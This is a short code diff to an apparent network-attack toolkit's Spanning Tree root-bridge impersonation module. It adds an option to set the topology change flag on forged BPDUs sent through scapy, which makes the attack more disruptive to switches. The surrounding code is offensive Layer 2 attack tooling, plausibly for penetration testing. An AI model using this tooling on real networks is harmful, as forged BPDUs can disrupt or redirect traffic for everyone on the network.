@@ -26,6 +26,7 @@ from scapy.all import sendp
 from macabre.attacks.bpdu_spoofing import (
     DEFAULT_PORT_ID,
     HELLO_TIME,
+    TC_FLAG,
     MAX_PATH_COST,
     MAX_PORT_ID,
     build_bpdu_frame,
@@ -47,6 +48,7 @@ class RootBridgeImpersonationConfig:
     count: int = 0                      # BPDUs to send; 0 = keep sending until stopped
     interval: float = HELLO_SECONDS     # refresh interval; 2 s is the standard hello time
     dry_run: bool = False               # build BPDUs but do not send them
+    topology_change: bool = False       # set the topology change flag in every BPDU
 
     def __post_init__(self) -> None:
         validate_priority(self.root_priority, "Root priority")
@@ -111,6 +113,7 @@ def run_root_bridge_impersonation(
             root_path_cost=config.root_path_cost,
             bridge_priority=config.bridge_priority,
             port_id=config.port_id,
+            flags=TC_FLAG if config.topology_change else 0,
         )
         send(frame, iface=config.iface, verbose=False)
         stats.frames += 1
